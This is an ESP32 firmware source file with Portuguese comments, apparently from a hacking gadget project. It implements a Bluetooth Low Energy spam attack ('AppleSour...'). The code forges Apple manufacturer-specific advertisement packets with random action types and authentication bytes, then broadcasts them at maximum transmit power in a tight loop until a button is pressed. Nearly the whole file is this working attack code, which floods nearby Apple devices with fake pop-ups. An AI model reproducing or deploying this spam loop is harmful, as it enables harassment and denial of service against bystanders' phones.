// ==================== CONFIGURAÇÕES DE BLE ====================
#define BLE_SPAM_DELAY 40

// Contador global para BLE
static int bleCounter = 1;
static NimBLEAdvertising *pAdvertising;

// ==================== SETUP BLE ====================
void Blesetup() {
  Serial.println(F("Init BLE..."));
  showMessage("Init BLE...");

  NimBLEDevice::init("");

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);

  NimBLEServer *pServer = NimBLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  Serial.println(F("BLE OK!"));
}

// ==================== GERA DADOS DE ADVERTISEMENT ====================
NimBLEAdvertisementData getOAdvertisementData() {
  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
  uint8_t packet[17];
  uint8_t i = 0;

  packet[i++] = 16;    // Packet Length
  packet[i++] = 0xFF;  // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;  // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;  // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;  // Length
  packet[i++] = 0xC1;  // Action Flags

  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type

  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;

  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x10;  // Type ???

  esp_fill_random(&packet[i], 3);

  randomAdvertisementData.addData(std::string((char *)packet, 17));
  return randomAdvertisementData;
}

// ==================== LOOP BLE SPAM ====================
void Bleloop() {
  bleCounter = 1;

  while (!btnUp.isPressed()) {
    delay(BLE_SPAM_DELAY);

    u8g2.clearBuffer();
    u8g2.setCursor(0, 10);
    u8g2.print("AppleSour...");
    u8g2.setCursor(0, 20);
    u8g2.print(bleCounter);
    bleCounter++;
    u8g2.sendBuffer();

    NimBLEAdvertisementData advertisementData = getOAdvertisementData();
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
  }
  NimBLEDevice::deinit();
}
